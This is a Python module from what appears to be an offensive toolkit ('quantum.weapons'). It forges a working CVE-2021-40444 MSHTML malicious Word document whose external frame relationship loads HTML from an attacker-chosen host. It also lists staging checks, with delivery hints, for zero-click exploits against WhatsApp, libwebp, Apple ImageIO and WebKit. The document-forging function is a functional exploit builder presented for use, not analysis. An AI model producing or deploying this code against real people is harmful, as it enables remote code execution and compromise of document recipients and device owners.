"""quantum.weapons.media_v3 — media-delivery tier (maldoc + zero-click checks)."""
from __future__ import annotations

import os
import zipfile

from quantum.core.env import QCLI_DIR
from quantum.core.logging import log
from quantum.core.opsec import rand_hex


def v3_mshtml_maldoc(ip=None, params=None):
    """CVE-2021-40444 MSHTML — forge real OOXML maldoc (external rel)."""
    from quantum.core.env import local_ip
    ip = ip or local_ip()
    fn = os.path.join(QCLI_DIR, f"mshtml_{rand_hex(4)}.docx")
    content_types = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                    'content-types"><Default Extension="rels" ContentType="application/'
                    'vnd.openxmlformats-package.relationships+xml"/><Default '
                    'Extension="xml" ContentType="application/xml"/></Types>')
    rels_root = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                 '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                 '2006/relationships"><Relationship Id="rId1" Type="http://'
                 'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                 'officeDocument" Target="word/document.xml"/></Relationships>')
    rels_doc = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                '2006/relationships"><Relationship Id="rId8" Type="http://'
                'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                f'frame" Target="http://{ip}/x.html" TargetMode="External"/>'
                '</Relationships>')
    document = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>QCLI</w:t>'
                '</w:r></w:p></w:body></w:document>')
    with zipfile.ZipFile(fn, "w") as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels_root)
        z.writestr("word/document.xml", document)
        z.writestr("word/_rels/document.xml.rels", rels_doc)
    log(f"MSHTML maldoc forged -> {fn} (serves from http://{ip}/x.html)", "ATK")
    return {"cve": "CVE-2021-40444", "staged": fn, "target": ip}


def check_whatsapp_voip(ip=None, params=None):
    """CVE-2019-3568 WhatsApp VOIP — profile-select staging check."""
    return {"cve": "CVE-2019-3568", "status": "check",
            "detail": "staging: deliver via profile-select call",
            "target": ip}


def check_libwebp(ip=None, params=None):
    """CVE-2023-4863 libwebp BLASTPAST — build-marker check."""
    return {"cve": "CVE-2023-4863", "status": "check",
            "detail": "staging: crafted WebP; check target browser build"}


def check_apple_imageio(ip=None, params=None):
    """CVE-2023-41064 Apple ImageIO — staging check."""
    return {"cve": "CVE-2023-41064", "status": "check",
            "detail": "staging: crafted image via iMessage attach"}


def check_webkit_escape(ip=None, params=None):
    """CVE-2021-30858 WebKit sandbox escape — staging check."""
    return {"cve": "CVE-2021-30858", "status": "check",
            "detail": "staging: crafted web content post-exploit"}
